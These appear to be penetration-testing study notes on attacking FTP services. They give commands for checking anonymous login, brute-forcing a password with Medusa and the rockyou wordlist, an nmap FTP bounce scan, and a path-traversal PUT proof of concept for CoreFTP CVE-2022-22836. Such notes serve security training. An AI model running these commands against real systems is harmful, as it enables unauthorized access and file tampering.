## Enumeration

Refer to Service enumeration.

## Misconfigurations

### Anonymous Authentication
```bash
## Directly FTP into server/host to check if anonymous login is enabled
ftp 192.168.2.142
```

## Protocol Specific Attacks

### Brute Forcing

```bash
## Brute-forcing with Medusa
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```

For other tools, refer to Password attacks.

### FTP Bounce Attack

Use `PORT` command to trick FTP connection into running commands and getting information about other devices.

```bash
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

## Noticeable FTP Vulnerability

### CVE-2022-22836

CoreFTP service allows an HTTP PUT request, which we can use to write content to files.

```bash
## PoC demonstration
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```